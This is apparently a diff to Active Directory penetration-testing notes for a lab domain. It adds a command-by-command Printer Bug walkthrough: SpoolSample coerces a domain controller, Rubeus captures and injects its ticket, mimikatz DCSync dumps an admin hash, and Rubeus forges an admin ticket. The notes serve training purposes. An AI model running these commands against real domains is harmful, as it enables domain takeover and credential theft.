@@ -200,7 +200,42 @@ Any valid domain user can request a kerberos ticket (ST) for any domain service.
 ## The Printer Bug
 > There is a bug in the Print System Remote protocol that can force a computer to authenticate to any computer in the domain, thus allowing us to capture the machine TGT
 
-* **We can use the [SpoolSample POC](https://github.com/leechristensen/SpoolSample) to accomplish this
+* **We can use the [SpoolSample POC](https://github.com/leechristensen/SpoolSample) to accomplish this**  
+
+### Execution
+  Note: 2 computers, sql01 & DC01
+  From SQL01:
+  ```powershell
+  .\Rubeus.exe monitor /interval:5 /nowrap
+  ```
+  Open another PS windowson SQL01
+  ```powershell
+  #Syntax
+  .\SpoolSample.exe <TargetServer> <CaptureServer>
+  # Example
+  .\SpoolSample.exe dc01.inlanefreight.local sql01.inlanefreight.local
+  ```
+  Renew the captured TGT w/ Rubeus
+  ```powershell
+  .\Rubeus.exe renew /ticket:<ticket> /ptt
+  ```
+  If we manage to capture the tgt, we can perform a DCSync and pwn the domain
+
+  Example
+  Dumping an admin user w/ mimikatz
+  ```powershell
+  mimikatz.exe
+  mimikatz > lsadump::dcsync /user:<Admin Username>
+  ```
+  Rubeus to request a ticket as that admin user
+  ```powershell
+  .\Rubeus.exe asktgt /rc4:<NTLM hash> /user:<admin username> /ptt
+  ```
+  We can now use this ticket to impersonate the administrative user.
+
+## S4U2self for Non-Domain Controllers
+
+
 
 **Mitigations**:
 
